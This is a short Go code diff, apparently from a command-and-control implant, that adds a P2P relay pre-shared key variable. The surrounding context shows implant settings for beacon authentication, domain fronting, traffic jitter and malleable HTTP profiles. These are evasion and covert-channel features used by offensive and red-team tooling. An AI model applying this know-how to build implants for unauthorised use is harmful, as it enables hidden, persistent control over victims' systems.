@@ -49,6 +49,7 @@ var (
 	BeaconKeyStr            string            = ""                            // pre-shared key used to derive registration auth ("" = no PSK auth)
 	RegSecretIDStr          string            = ""                            // v3: per-implant registration secret id ("" = v2 master-key derivation)
 	RegSecretStr            string            = ""                            // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
+	P2PSharedSecret         string            = ""                            // P2P relay pre-shared key (base64 32 bytes). Build pipelines stamp this via -ldflags so parent + child implants share a mesh key. "" = no P2P auth (legacy)
 	DomainFront             string            = ""                            // Domain fronting: override HTTP Host header ("" = disabled)
 	ContentLengthJitter     int               = 0                             // Max random padding bytes for HTTP body (0=disabled)
 	MalleablePrepend        string            = ""                            // bytes prepended to every HTTP beacon response body (server malleable profile)
